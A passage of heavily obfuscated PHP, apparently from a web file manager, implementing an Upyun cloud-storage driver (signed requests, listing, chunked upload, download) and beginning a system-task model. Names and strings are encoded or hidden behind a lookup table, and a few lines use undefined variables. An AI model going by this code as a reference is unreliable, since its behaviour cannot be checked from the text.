return $Ê÷š£ë£; } } public function hashMd5($†«¢ØêŞ = false) { return md5($this->getContent()); } public static function hash($¡¸­£ûÛ, $Ó‡“Ñü´ = 0) { $±÷Ÿ©ï… = new PathDriverStream($¡¸­£ûÛ, $Ó‡“Ñü´); return $±÷Ÿ©ï…->hashSimple($¡¸­£ûÛ); } public static function md5($ÈõƒİÖ, $ˆğÇÀæÜ = 0) { $éì¿‚¼Í = new PathDriverStream($ÈõƒİÖ, $ˆğÇÀæÜ); return $éì¿‚¼Í->hashMd5($ÈõƒİÖ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\x3a\x2f\57\x76\x30\56\141\160\151\56\x75\x70\x79\x75\x6e\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Î¡øÆÑë) { parent::__construct(); $this->_init($Î¡øÆÑë); } public function _init($Ò€ ™Üó) { $´âæ³¦™ =& $_SERVER[Ó¡Ÿ§‚]; foreach ($Ò€ ™Üó as $¸“¿˜­Ñ => $Ê…±ãÓÛ) { if (isset($this->{$¸“¿˜­Ñ})) { $this->{$¸“¿˜­Ñ} = $Ê…±ãÓÛ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($´âæ³¦™[1464] . LNG($´âæ³¦™[1395])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($é½µª§•, $’öç­Ö = "\107\105\x54") { $ÚÑ§ŸÆæ =& $_SERVER[Ó¡Ÿ§‚]; $İã…ˆÎÊ = gmdate($ÚÑ§ŸÆæ[1428]); $Çù÷„‹´ = base64_encode(hash_hmac($ÚÑ§ŸÆæ[1465], "{$’öç­Ö}\x26{$é½µª§•}\x26{$İã…ˆÎÊ}", md5("{$this->userpass}"), !0)); $ª³Ÿ³ó¡ = array("\101\x75\x74\150\x6f\162\x69\172\x61\x74\x69\157\156\72\125\120\x59\x55\116\40{$this->username}\72{$Çù÷„‹´}", "\x44\141\164\x65\x3a{$İã…ˆÎÊ}"); return $ª³Ÿ³ó¡; } public function ussRequest($ÑÇûÏü¹, $‹™””»» = "\x47\x45\x54", $óÊœáçª = false, $×ÎÅíú = false, $ÎÁç÷— = false) { $æ¯ˆøİ¡ =& $_SERVER[Ó¡Ÿ§‚]; $ÑÇûÏü¹ = trim($ÑÇûÏü¹, $æ¯ˆøİ¡[8]); $œ®—Ç¹ = "\57{$this->bucket}\57{$ÑÇûÏü¹}"; $»İÍñß¡ = $this->ussHeaders($œ®—Ç¹, $‹™””»»); if ($×ÎÅíú) { $»İÍñß¡ = array_merge($»İÍñß¡, $×ÎÅíú); } $Ÿ¡îÂ Õ = url_request($this->endpoint . $œ®—Ç¹, $‹™””»», $óÊœáçª, $»İÍñß¡, $ÎÁç÷—); if (!$Ÿ¡îÂ Õ) { return array($æ¯ˆøİ¡[1211] => !1, $æ¯ˆøİ¡[1201] => $æ¯ˆøİ¡[1466]); } if (strtolower($‹™””»») == $æ¯ˆøİ¡[197] || in_array($Ÿ¡îÂ Õ[$æ¯ˆøİ¡[1211]], array($æ¯ˆøİ¡[1321], $æ¯ˆøİ¡[1467]))) { $óÊœáçª = $Ÿ¡îÂ Õ[$æ¯ˆøİ¡[1468]]; } else { $óÊœáçª = json_decode($Ÿ¡îÂ Õ[$æ¯ˆøİ¡[1201]], !0); if (!$óÊœáçª) { $óÊœáçª = $Ÿ¡îÂ Õ[$æ¯ˆøİ¡[1201]]; } else { if (!$Ÿ¡îÂ Õ[$æ¯ˆøİ¡[748]] && isset($óÊœáçª[$æ¯ˆøİ¡[1469]])) { $óÊœáçª = $óÊœáçª[$æ¯ˆøİ¡[1469]]; } } } return array($æ¯ˆøİ¡[1211] => $Ÿ¡îÂ Õ[$æ¯ˆøİ¡[748]], $æ¯ˆøİ¡[1201] => $óÊœáçª); } public function mkfile($–Ğ¢»†½, $–œ²Îğë = '', $¶–ë“ª‰ = REPEAT_RENAME) { if ($this->setContent($–Ğ¢»†½, $–œ²Îğë)) { return $this->getPathOuter($–Ğ¢»†½); } return !1; } public function mkdir($«ÆâœıÇ, $àÙëú£Ë = REPEAT_SKIP) { $ûÁÁ¦Àó =& $_SERVER[Ó¡Ÿ§‚]; $†¨„ıÒ€ = trim($«ÆâœıÇ, $ûÁÁ¦Àó[8]); if ($this->_isFolder($†¨„ıÒ€)) { return $this->getPathOuter($†¨„ıÒ€); } $¢ŸğöÊº = array($ûÁÁ¦Àó[1470]); $Û¿«Ñ‘ = $this->ussRequest($†¨„ıÒ€, $ûÁÁ¦Àó[226], !1, $¢ŸğöÊº); return $Û¿«Ñ‘[$ûÁÁ¦Àó[1211]] ? $this->getPathOuter($†¨„ıÒ€) : !1; } public function copyFile($Ã ¨¹˜¨, $ôÑÏİ»Ô) { $©™¿õ‹ =& $_SERVER[Ó¡Ÿ§‚]; $¥™÷öÜœ = array($©™¿õ‹[1471] . "\57{$this->bucket}\x2f{$Ã ¨¹˜¨}", $©™¿õ‹[1472]); $»É¸®Ää = $this->ussRequest($ôÑÏİ»Ô, $©™¿õ‹[228], !1, $¥™÷öÜœ); return $»É¸®Ää[$©™¿õ‹[1211]] ? !0 : $this->getPathOuter($ôÑÏİ»Ô); } public function moveFile($äûÎˆ£, $Ä¤‡•¬Â) { $¾ìö€—¢ =& $_SERVER[Ó¡Ÿ§‚]; $êïÉáİ¨ = array($¾ìö€—¢[1473] . "\x2f{$this->bucket}\x2f{$äûÎˆ£}", $¾ìö€—¢[1472]); $ã å—ÃÇ = $this->ussRequest($Ä¤‡•¬Â, $¾ìö€—¢[228], !1, $êïÉáİ¨); return $ã å—ÃÇ[$¾ìö€—¢[1211]] ? !0 : $this->getPathOuter($Ä¤‡•¬Â); } public function delFile($»õ¾¶É) { $ç¥¤®ÃØ =& $_SERVER[Ó¡Ÿ§‚]; $¶ê²¢ş› = $this->ussRequest($»õ¾¶É, $ç¥¤®ÃØ[1474]); return $¶ê²¢ş›[$ç¥¤®ÃØ[1211]] ? !0 : !1; } public function delFolder($–ÙÁâş”) { $ï„š°´¤ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->exist($–ÙÁâş”)) { return !0; } $this->listItemCache = !1; $š›Èşí = $«ßº¯— = array(); $this->fileList($–ÙÁâş”, $š›Èşí, $«ßº¯—, !0); $this->listItemCache = !0; foreach ($«ßº¯— as $ÍÒÂáİ) { $÷£¿‚¢‰ = $this->ussRequest($ÍÒÂáİ[$ï„š°´¤[32]], $ï„š°´¤[1474]); if (!$÷£¿‚¢‰[$ï„š°´¤[1211]]) { return !1; } } foreach ($š›Èşí as $¥¬ûÂà) { $÷£¿‚¢‰ = $this->ussRequest($¥¬ûÂà, $ï„š°´¤[1474]); if (!$÷£¿‚¢‰[$ï„š°´¤[1211]]) { return !1; } } $÷£¿‚¢‰ = $this->ussRequest($–ÙÁâş”, $ï„š°´¤[1474]); return $÷£¿‚¢‰[$ï„š°´¤[1211]]; } public function rename($…˜ÀË¸, $«˜³öñõ) { if ($this->isFile($…˜ÀË¸)) { $«˜³öñõ = get_path_father($…˜ÀË¸) . $«˜³öñõ; return $this->moveFile($…˜ÀË¸, $«˜³öñõ); } return $this->renameObject($…˜ÀË¸, $«˜³öñõ); } public function fileInfo($£óÑÕÍ¹, $’â¦ıü÷ = false, $‡ƒó´° = array()) { $“¬·¨¸ =& $_SERVER[Ó¡Ÿ§‚]; $å­³³·ô = array($“¬·¨¸[32] => $this->pathThis($£óÑÕÍ¹), $“¬·¨¸[84] => $this->getPathOuter($“¬·¨¸[8] . $£óÑÕÍ¹), $“¬·¨¸[33] => $“¬·¨¸[200], $“¬·¨¸[76] => isset($‡ƒó´°[$“¬·¨¸[76]]) ? $‡ƒó´°[$“¬·¨¸[76]] : 0, $“¬·¨¸[174] => $this->ext($£óÑÕÍ¹)); if ($’â¦ıü÷) { return $å­³³·ô; } $å­³³·ô[$“¬·¨¸[201]] = $å­³³·ô[$“¬·¨¸[85]] = 0; $å­³³·ô[$“¬·¨¸[202]] = $å­³³·ô[$“¬·¨¸[203]] = !0; if (empty($‡ƒó´°)) { $‡ƒó´° = $this->objectMeta($£óÑÕÍ¹); if (!$‡ƒó´°) { return $å­³³·ô; } } $å­³³·ô[$“¬·¨¸[201]] = intval($‡ƒó´°[$“¬·¨¸[1475]]); $å­³³·ô[$“¬·¨¸[85]] = intval($‡ƒó´°[$“¬·¨¸[1476]]); $å­³³·ô[$“¬·¨¸[76]] = $‡ƒó´°[$“¬·¨¸[76]]; return $å­³³·ô; } public function folderInfo($Ëš„şàÇ, $§Ä‰ƒì = false) { $˜å‘ÛŒÒ =& $_SERVER[Ó¡Ÿ§‚]; $ö×å ²¯ = array($˜å‘ÛŒÒ[32] => $this->pathThis($Ëš„şàÇ), $˜å‘ÛŒÒ[84] => $this->getPathOuter($˜å‘ÛŒÒ[8] . $Ëš„şàÇ), $˜å‘ÛŒÒ[33] => $˜å‘ÛŒÒ[75]); if ($§Ä‰ƒì) { return $ö×å ²¯; } $ö×å ²¯[$˜å‘ÛŒÒ[201]] = $ö×å ²¯[$˜å‘ÛŒÒ[85]] = 0; $ö×å ²¯[$˜å‘ÛŒÒ[202]] = $ö×å ²¯[$˜å‘ÛŒÒ[203]] = !0; if (empty($Ş¥®î¶Æ)) { $Ş¥®î¶Æ = $this->objectMeta($Ëš„şàÇ); if (!$Ş¥®î¶Æ) { return $ö×å ²¯; } } $ö×å ²¯[$˜å‘ÛŒÒ[201]] = intval($Ş¥®î¶Æ[$˜å‘ÛŒÒ[1475]]); $ö×å ²¯[$˜å‘ÛŒÒ[85]] = intval($Ş¥®î¶Æ[$˜å‘ÛŒÒ[1476]]); return $ö×å ²¯; } private function listObjs($ôÉ„Øš­, $æ£›Ú¤± = 0, $¬…ˆ•×Â = 1000) { $ò³‚ µ¤ =& $_SERVER[Ó¡Ÿ§‚]; $ß†ËæÁø = array($ò³‚ µ¤[1477], $ò³‚ µ¤[1478] . $¬…ˆ•×Â); if ($æ£›Ú¤±) { $ß†ËæÁø[] = $ò³‚ µ¤[1479] . $æ£›Ú¤±; } $™ºÄÌí¬ = $this->ussRequest($ôÉ„Øš­, $ò³‚ µ¤[230], !1, $ß†ËæÁø); return !$™ºÄÌí¬[$ò³‚ µ¤[1211]] ? !1 : $™ºÄÌí¬[$ò³‚ µ¤[1201]]; } private function fileList($Ğò¤Äü¯, &$ÍÒ¼„Âë, &$èÀü‚Ä², $½ÒçŸÇ = false) { $Í“Ò‹ =& $_SERVER[Ó¡Ÿ§‚]; $»Ê„äÖ¼ = $Í“Ò‹[12]; $ôãÚ¡ÂŞ = 1000; $¶ÓÔ‡—Œ = rtrim($Ğò¤Äü¯, $Í“Ò‹[8]) . $Í“Ò‹[8]; while (!0) { check_abort(); $¹äÅ´ÎÃ = $this->listObjs($Ğò¤Äü¯, $»Ê„äÖ¼, $ôãÚ¡ÂŞ); if (!$¹äÅ´ÎÃ) { return !1; } $»Ê„äÖ¼ = isset($¹äÅ´ÎÃ[$Í“Ò‹[1480]]) ? $¹äÅ´ÎÃ[$Í“Ò‹[1480]] : $Í“Ò‹[12]; $âàÜ•’Ó = isset($¹äÅ´ÎÃ[$Í“Ò‹[1481]]) ? $¹äÅ´ÎÃ[$Í“Ò‹[1481]] : array(); foreach ($âàÜ•’Ó as $´‰³—ó—) { $“Âíáùø = $´‰³—ó—[$Í“Ò‹[33]] == $Í“Ò‹[75] ? !0 : !1; $ÖäÖ¿æ˜ = ltrim($¶ÓÔ‡—Œ . $´‰³—ó—[$Í“Ò‹[32]], $Í“Ò‹[8]) . ($“Âíáùø ? $Í“Ò‹[8] : $Í“Ò‹[12]); $ğÀÖºƒÈ = array($Í“Ò‹[32] => $ÖäÖ¿æ˜, $Í“Ò‹[33] => $“Âíáùø ? $Í“Ò‹[75] : $Í“Ò‹[200], $Í“Ò‹[76] => $´‰³—ó—[$Í“Ò‹[337]], $Í“Ò‹[1476] => $´‰³—ó—[$Í“Ò‹[1482]]); $this->cacheMethodInfoSet($ÖäÖ¿æ˜, $“Âíáùø, $ğÀÖºƒÈ); if ($“Âíáùø) { $ÍÒ¼„Âë[] = $ÖäÖ¿æ˜; if ($½ÒçŸÇ) { $this->fileList($ÖäÖ¿æ˜, $ÍÒ¼„Âë, $èÀü‚Ä², $½ÒçŸÇ); } continue; } $èÀü‚Ä²[] = $ğÀÖºƒÈ; } if (count($âàÜ•’Ó) < $ôãÚ¡ÂŞ) { break; } } $this->cacheMethodInfoSet($Ğò¤Äü¯, !0); } public function listPath($œÕ˜£ë, $ê¸¬’÷¦ = false) { $ßäˆšå =& $_SERVER[Ó¡Ÿ§‚]; $Ş—Ÿ = $ÊãËƒÀ¼ = array(); $this->fileList($œÕ˜£ë, $Ş—Ÿ, $ÊãËƒÀ¼); foreach ($Ş—Ÿ as $²Ø¢—æ‘ => $ŠËùß„Ô) { $Ş—Ÿ[$²Ø¢—æ‘] = $this->folderInfo($ŠËùß„Ô, $ê¸¬’÷¦); } foreach ($ÊãËƒÀ¼ as $²Ø¢—æ‘ => $ŠËùß„Ô) { $ÊãËƒÀ¼[$²Ø¢—æ‘] = $this->fileInfo($ŠËùß„Ô[$ßäˆšå[32]], $ê¸¬’÷¦, $ŠËùß„Ô); } return array($ßäˆšå[82] => $Ş—Ÿ, $ßäˆšå[83] => $ÊãËƒÀ¼); } public function has($—şåÉ¹á, $Ïœò‚’ = false, $„§Ñ×Ää = true) { $¥Ä‡“Å¨ =& $_SERVER[Ó¡Ÿ§‚]; $¸Â·¹› = $¥Ä‡“Å¨[12]; $Ğî…ÔÊÚ = 500; $ÂğÓıƒ´ = 0; $ŞĞå…ëô = 0; $‚½©ú½· = rtrim($—şåÉ¹á, $¥Ä‡“Å¨[8]) . $¥Ä‡“Å¨[8]; while (!0) { check_abort(); $³Ò™²‡® = $this->listObjs($—şåÉ¹á, $¸Â·¹›, $Ğî…ÔÊÚ); if (!$³Ò™²‡®) { return !1; } $¸Â·¹› = isset($³Ò™²‡®[$¥Ä‡“Å¨[1480]]) ? $³Ò™²‡®[$¥Ä‡“Å¨[1480]] : $¥Ä‡“Å¨[12]; $½Î·¶ß = isset($³Ò™²‡®[$¥Ä‡“Å¨[1481]]) ? $³Ò™²‡®[$¥Ä‡“Å¨[1481]] : array(); if (empty($½Î·¶ß)) { break; } $öëü°›ä = array_filter($½Î·¶ß, function ($Ìæö²™) { $ÙÂ´³¨Ì =& $_SERVER[Ó¡Ÿ§‚]; return $Ìæö²™[$ÙÂ´³¨Ì[33]] == $ÙÂ´³¨Ì[75]; }); $¥èªŸ† = count($½Î·¶ß); $öëü°›ä = count($öëü°›ä); $©”Š‚á = $¥èªŸ† - $öëü°›ä; if ($Ïœò‚’) { $ŞĞå…ëô += $öëü°›ä; $ÂğÓıƒ´ += $©”Š‚á; if ($¥èªŸ† < $Ğî…ÔÊÚ) { break; } continue; } if ($„§Ñ×Ää) { if ($©”Š‚á) { return !0; } } else { if ($öëü°›ä) { return !0; } } if ($¥èªŸ† < $Ğî…ÔÊÚ) { break; } } if ($Ïœò‚’) { return array($¥Ä‡“Å¨[207] => $ÂğÓıƒ´, $¥Ä‡“Å¨[208] => $ŞĞå…ëô); } return !1; } public function listAll($£ö„ê¸”) { $¯¦‘æÃ =& $_SERVER[Ó¡Ÿ§‚]; $®¹­ÉØ = $åÍÏŠ·© = array(); $this->fileList($£ö„ê¸”, $®¹­ÉØ, $åÍÏŠ·©, !0); $ÆÔæ°İ = array_to_keyvalue($åÍÏŠ·©, $¯¦‘æÃ[32]); foreach ($®¹­ÉØ as $œÆÖ†Ô¬) { if (is_string($œÆÖ†Ô¬)) { $ÆÔæ°İ[$œÆÖ†Ô¬] = array($¯¦‘æÃ[76] => 0); } } return $this->listAllFiles($£ö„ê¸”, $ÆÔæ°İ); } public function canRead($â®ˆšÏ…) { return $this->exist($â®ˆšÏ…) ? !0 : !1; } public function canWrite($ÌÜ– ™‡) { return $this->exist($ÌÜ– ™‡) ? !0 : !1; } public function getContent($÷Çü°) { return $this->fileSubstr($÷Çü°, 0, -1); } public function setContent($Â‚ØóŞİ, $©«ÏÚ°Š = '') { $¤ÔšŞâ‘ =& $_SERVER[Ó¡Ÿ§‚]; if (!$©«ÏÚ°Š) { $€Ç‘œ = $this->ussRequest($Â‚ØóŞİ, $¤ÔšŞâ‘[226]); return $€Ç‘œ[$¤ÔšŞâ‘[1211]]; } $¯ß×›Ô = $this->tempFile($this->pathThis($Â‚ØóŞİ)); file_put_contents($¯ß×›Ô, $©«ÏÚ°Š); if ($this->upload($Â‚ØóŞİ, $¯ß×›Ô)) { $this->tempFileRemve($¯ß×›Ô); return !0; } return !1; } public function fileSubstr($ÛºÜŠ›, $…Ë¼Ûúü, $Ê²´İš) { $ÃÑ–›’Ñ =& $_SERVER[Ó¡Ÿ§‚]; if (!($ğµÅÈä… = $this->link($ÛºÜŠ›))) { return !1; } $¨×­¹›î = !1; if ($Ê²´İš > 0) { $’ıŞÙ³£ = $…Ë¼Ûúü + $Ê²´İš - 1; $¨×­¹›î = array($ÃÑ–›’Ñ[1443] . $…Ë¼Ûúü . $ÃÑ–›’Ñ[386] . $’ıŞÙ³£); } $¤İƒ™´À = url_request($ğµÅÈä…, $ÃÑ–›’Ñ[230], !1, $¨×­¹›î); return $¤İƒ™´À[$ÃÑ–›’Ñ[748]] ? $¤İƒ™´À[$ÃÑ–›’Ñ[1201]] : !1; } public function upload($®‚˜²²Ü, $ƒ‹õßê‰, $‡´ÇüÉ = false, $ëùã·ìö = REPEAT_REPLACE) { $› ¢íÃ» =& $_SERVER[Ó¡Ÿ§‚]; $á«¯Ÿí÷ = IO::size($ƒ‹õßê‰); if ($á«¯Ÿí÷ <= 1024 * 1024 * 200) { $ŒÁ²ô£ = array($› ¢íÃ»[1483] . $ƒ‹õßê‰); $ËÔ´®³ş = $this->ussRequest($®‚˜²²Ü, $› ¢íÃ»[228], $ŒÁ²ô£); return $ËÔ´®³ş[$› ¢íÃ»[1211]] ? $this->getPathOuter($®‚˜²²Ü) : !1; } $áÈŠé‘Õ = 1024 * 1024 * 10; $•¹Í÷‚ˆ = array($› ¢íÃ»[1484], $› ¢íÃ»[1485] . $á«¯Ÿí÷, $› ¢íÃ»[1486], $› ¢íÃ»[1487] . $áÈŠé‘Õ); $ËÔ´®³ş = $this->ussRequest($®‚˜²²Ü, $› ¢íÃ»[228], !1, $•¹Í÷‚ˆ); if (!$ËÔ´®³ş[$› ¢íÃ»[1211]]) { return !1; } $şŞÉÒ¤Ä = $ËÔ´®³ş[$› ¢íÃ»[1201]]; $šåÍ™óİ = 0; $®­Œ†Á  = $şŞÉÒ¤Ä[$› ¢íÃ»[1488]]; $«†äÂŒ¾ = fopen($ƒ‹õßê‰, $› ¢íÃ»[1392]); if (!$«†äÂŒ¾) { return !1; } do { $ùäšÖ‡ = $şŞÉÒ¤Ä[$› ¢íÃ»[1489]]; fseek_64($«†äÂŒ¾, $šåÍ™óİ); $åÖ¡öÅ¤ = fread($«†äÂŒ¾, $ùäšÖ‡); $ÆªİÂê¿ = 0; do { $ÆªİÂê¿++; $şŞÉÒ¤Ä = $this->uploadPart($®‚˜²²Ü, $şŞÉÒ¤Ä, $åÖ¡öÅ¤); } while (!$şŞÉÒ¤Ä && $ÆªİÂê¿ < 3); if (!$şŞÉÒ¤Ä) { return !1; } $®­Œ†Á  = $şŞÉÒ¤Ä[$› ¢íÃ»[1488]]; $šåÍ™óİ += $ùäšÖ‡; } while ($®­Œ†Á  != -1); fclose($«†äÂŒ¾); $•¹Í÷‚ˆ = array($› ¢íÃ»[1490], $› ¢íÃ»[1491] . $şŞÉÒ¤Ä[$› ¢íÃ»[1492]], $› ¢íÃ»[1486]); $ËÔ´®³ş = $this->ussRequest($®‚˜²²Ü, $› ¢íÃ»[228], !1, $•¹Í÷‚ˆ); return $ËÔ´®³ş[$› ¢íÃ»[1211]] ? $this->getPathOuter($šˆıı×Å) : !1; } private function uploadPart($Ø“éïßµ, $ìƒäí¸÷, &$ßà¡¸) { $ÌÌŒî›Œ =& $_SERVER[Ó¡Ÿ§‚]; $Ö«¾ñà³ = array($ÌÌŒî›Œ[1493], $ÌÌŒî›Œ[1491] . $ìƒäí¸÷[$ÌÌŒî›Œ[1492]], $ÌÌŒî›Œ[1494] . $ìƒäí¸÷[$ÌÌŒî›Œ[1488]], $ÌÌŒî›Œ[142] . $ìƒäí¸÷[$ÌÌŒî›Œ[1489]]); $üå‚Ğ×Ô = $this->ussRequest($Ø“éïßµ, $ÌÌŒî›Œ[228], $ßà¡¸, $Ö«¾ñà³); return !$üå‚Ğ×Ô[$ÌÌŒî›Œ[1211]] ? $üå‚Ğ×Ô[$ÌÌŒî›Œ[1211]] : $üå‚Ğ×Ô[$ÌÌŒî›Œ[1201]]; } public function uploadFormData($”•“Õ³, $€İ¢Ë´ = 3600) { return $this->uploadPolicy($”•“Õ³, $€İ¢Ë´); } public function multiUploadFormData($ó ¶ò, $–Ì®¸êš = 3600) { $î²ù¬Üü =& $_SERVER[Ó¡Ÿ§‚]; $¨ÄæÏ‚± = (int) $GLOBALS[$î²ù¬Üü[7]][$î²ù¬Üü[76]]; return $this->uploadPolicy($ó ¶ò, $–Ì®¸êš, $¨ÄæÏ‚±); } private function uploadPolicy($²šÁ²İë, $ÆñÄõë = 3600, $ÌŞÌš›Ú = 0) { $Ëü¥°– =& $_SERVER[Ó¡Ÿ§‚]; $°áÌÊÄ§ = $Ëü¥°–[8] . $this->bucket; $€‰îîâñ = gmdate($Ëü¥°–[1428]); $é×ŸÙ‹İ = array($Ëü¥°–[1495] => $this->bucket, $Ëü¥°–[1496] => $²šÁ²İë, $Ëü¥°–[1497] => time() + $ÆñÄõë, $Ëü¥°–[1498] => $€‰îîâñ); if ($ÌŞÌš›Ú) { $é×ŸÙ‹İ[$Ëü¥°–[1408]] = $ÌŞÌš›Ú; } $Øø³üÚ” = base64_encode(json_encode($é×ŸÙ‹İ)); $øô«Ñªá = base64_encode(hash_hmac($Ëü¥°–[1465], "\x50\117\x53\x54\46{$°áÌÊÄ§}\x26{$€‰îîâñ}\x26{$Øø³üÚ”}", md5("{$this->userpass}"), !0)); $ƒ÷·ßœò = array($Ëü¥°–[1333] => $Øø³üÚ”, $Ëü¥°–[1499] => "\x55\120\x59\x55\x4e\x20{$this->username}\72{$øô«Ñªá}", $Ëü¥°–[182] => $this->endpoint . $°áÌÊÄ§); return $ƒ÷·ßœò; } public function download($ÑèÍŠí‹, $¨¹Ã˜âß) { $¢ÄäÃñØ = IO::getPathInner(IO::mkfile($¨¹Ã˜âß)); if (!($­İ¶¢ëÎ = $this->link($ÑèÍŠí‹))) { return !1; } $úëÏİ¥ = 0; $×çõƒÛ† = 1024 * 200; $†úµ¡óË = fopen($¢ÄäÃñØ, $_SERVER[Ó¡Ÿ§‚][1449]); while (!0) { $şÁêÜ´° = $this->fileSubstr($ÑèÍŠí‹, $úëÏİ¥, $×çõƒÛ†); if ($şÁêÜ´° === !1) { return !1; } fwrite($†úµ¡óË, $şÁêÜ´°); $úëÏİ¥ += $×çõƒÛ†; if (strlen($şÁêÜ´°) < $×çõƒÛ†) { break; } } fclose($†úµ¡óË); return $¨¹Ã˜âß; } public function link($Åª½Ç´Ì, $ëÑ ™š = array()) { $óô™‘Üá =& $_SERVER[Ó¡Ÿ§‚]; $Åª½Ç´Ì = trim($Åª½Ç´Ì, $óô™‘Üá[8]); if (!empty($this->token)) { $ÈŠêÔ™¿ = strtotime(date($óô™‘Üá[1500])); $µÅûÑ±° = substr(md5($this->token . $óô™‘Üá[284] . $ÈŠêÔ™¿ . $óô™‘Üá[1501] . $Åª½Ç´Ì), 12, 8) . $ÈŠêÔ™¿; $ëÑ ™š[] = $óô™‘Üá[1502] . $µÅûÑ±°; } $ğ³°š™ú = !empty($ëÑ ™š) ? $óô™‘Üá[73] . implode($óô™‘Üá[284], $ëÑ ™š) : $óô™‘Üá[12]; return $this->getHost() . $óô™‘Üá[8] . $Åª½Ç´Ì . $ğ³°š™ú; } public function fileOut($ñÍù™·», $€§¤şÙÕ = false, $ë°ş¦Ï = false, $æá›¡×ª = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ñÍù™·», $€§¤şÙÕ, $ë°ş¦Ï, $æá›¡×ª); } if (!$ë°ş¦Ï) { $ë°ş¦Ï = $this->pathThis($ñÍù™·»); } $³§ÄÖïå = $€§¤şÙÕ ? array($_SERVER[Ó¡Ÿ§‚][1503] . rawurlencode($ë°ş¦Ï)) : array(); $Î¸°é¨ = $this->link($ñÍù™·», $³§ÄÖïå); $this->fileOutLink($Î¸°é¨); } public function fileOutServer($Š¼¯Ú, $Ï›Š’ê = false, $æÔŞ¨ï¾ = false, $Ã€¤£ = '') { parent::fileOut($Š¼¯Ú, $Ï›Š’ê, $æÔŞ¨ï¾, $Ã€¤£); } public function fileOutImage($™²ğ›’, $®ş™Æ÷ = 250) { $Í±£ø½ = $this->link($™²ğ›’ . $_SERVER[Ó¡Ÿ§‚][1504] . $®ş™Æ÷); $this->fileOutLink($Í±£ø½); } public function fileOutImageServer($—Û£ç‚, $ûÑ©Êùú = 250) { parent::fileOutImage($—Û£ç‚, $ûÑ©Êùú); } public function hashMd5($¡……Ñ»ˆ) { $²ºû‘È =& $_SERVER[Ó¡Ÿ§‚]; $˜Ø“î·‡ = $this->_objectMeta($¡……Ñ»ˆ); return isset($˜Ø“î·‡[$²ºû‘È[212]]) ? $˜Ø“î·‡[$²ºû‘È[212]] : !1; } public function size($İ™ıíî) { $ÈÂĞóª = $this->objectMeta($İ™ıíî); return $ÈÂĞóª ? $ÈÂĞóª[$_SERVER[Ó¡Ÿ§‚][76]] : 0; } public function info($ÔÀ· ó) { if ($this->isFolder($ÔÀ· ó)) { return $this->folderInfo($ÔÀ· ó); } else { if ($this->isFile($ÔÀ· ó)) { return $this->fileInfo($ÔÀ· ó); } } return !1; } public function exist($ÔÄùñåÓ) { return $this->isFile($ÔÄùñåÓ) || $this->isFolder($ÔÄùñåÓ); } public function isFile($œÎôÃë‚) { return !$this->isFolder($œÎôÃë‚) && $this->objectMeta($œÎôÃë‚); } public function isFolder($üß±¨È‚) { return $this->cacheMethod($_SERVER[Ó¡Ÿ§‚][165], $üß±¨È‚); } protected function objectMeta($©Ùà×³Ì) { return $this->cacheMethod($_SERVER[Ó¡Ÿ§‚][167], $©Ùà×³Ì); } protected function _objectMeta($¹ºÃıö¨) { $ÒıäŞß =& $_SERVER[Ó¡Ÿ§‚]; if ($¹ºÃıö¨ == $ÒıäŞß[12] || $¹ºÃıö¨ == $ÒıäŞß[8]) { return array(); } $ÈÖü†ûä = $this->ussRequest($¹ºÃıö¨, $ÒıäŞß[1505]); if (!$ÈÖü†ûä[$ÒıäŞß[1211]]) { return null; } $Â‚¿Ë™´ = isset($ÈÖü†ûä[$ÒıäŞß[1201]]) ? $ÈÖü†ûä[$ÒıäŞß[1201]] : array(); if (!isset($Â‚¿Ë™´[$ÒıäŞß[1506]])) { return null; } $ƒ¢÷Íì = array($ÒıäŞß[33] => isset($Â‚¿Ë™´[$ÒıäŞß[1506]]) ? $Â‚¿Ë™´[$ÒıäŞß[1506]] : null, $ÒıäŞß[76] => isset($Â‚¿Ë™´[$ÒıäŞß[1507]]) ? $Â‚¿Ë™´[$ÒıäŞß[1507]] : null, $ÒıäŞß[212] => isset($Â‚¿Ë™´[$ÒıäŞß[1508]]) ? $Â‚¿Ë™´[$ÒıäŞß[1508]] : null, $ÒıäŞß[1475] => isset($Â‚¿Ë™´[$ÒıäŞß[1509]]) ? $Â‚¿Ë™´[$ÒıäŞß[1509]] : null); $ƒ¢÷Íì[$ÒıäŞß[1476]] = isset($Â‚¿Ë™´[$ÒıäŞß[1510]]) ? strtotime($Â‚¿Ë™´[$ÒıäŞß[1510]]) : $ƒ¢÷Íì[$ÒıäŞß[1475]]; return $ƒ¢÷Íì; } protected function _isFolder($Ëã¶“Ë) { $±üòµÙ =& $_SERVER[Ó¡Ÿ§‚]; if ($Ëã¶“Ë == $±üòµÙ[12] || $Ëã¶“Ë == $±üòµÙ[8]) { return !0; } $Şü¥ƒ = $this->_objectMeta($Ëã¶“Ë); return isset($Şü¥ƒ[$±üòµÙ[33]]) && $Şü¥ƒ[$±üòµÙ[33]] == $±üòµÙ[75] ? !0 : !1; } } goto A®Šä®ªßò; eƒ÷¿‡ì†‘: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\56\x74\141\x73\x6b\114\x69\163\x74"; public $field = array("\156\141\x6d\145", "\164\171\x70\145", "\145\x76\145\156\x74", "\164\x69\x6d\145", "\144\x65\x73\143", "\x73\171\x73\x74\145\155", "\145\x6e\x61\142\x6c\145", "\154\x61\x73\164\122\x75\156", "\x73\x6f\162\x74"); public function listData($µîëÓ§‘ = false, $šÄ­¾‡¦ = "\163\x6f\162\x74", $¿ĞÅÏê = false) { return parent::listData($µîëÓ§‘, $šÄ­¾‡¦, $¿ĞÅÏê); } public function add($º«ıšØÃ) { $¼çáæ¯½ =& $_SERVER[Ó¡Ÿ§‚]; $ãçøò“è = $this->findByName($º«ıšØÃ[$¼çáæ¯½[32]]); if ($ãçøò“è) { return !1; } $º«ıšØÃ[$¼çáæ¯½[1625]] = 0; $º«ıšØÃ[$¼çáæ¯½[1878]] = $this->getSort(); return parent::insert($º«ıšØÃ); } private function getSort() { $ÜåŞé® =& $_SERVER[Ó¡Ÿ§‚]; $ù¿»øĞï = parent::listData(); $ÒŒ–³ÏŸ = array_to_keyvalue($ù¿»øĞï, $ÜåŞé®[12], 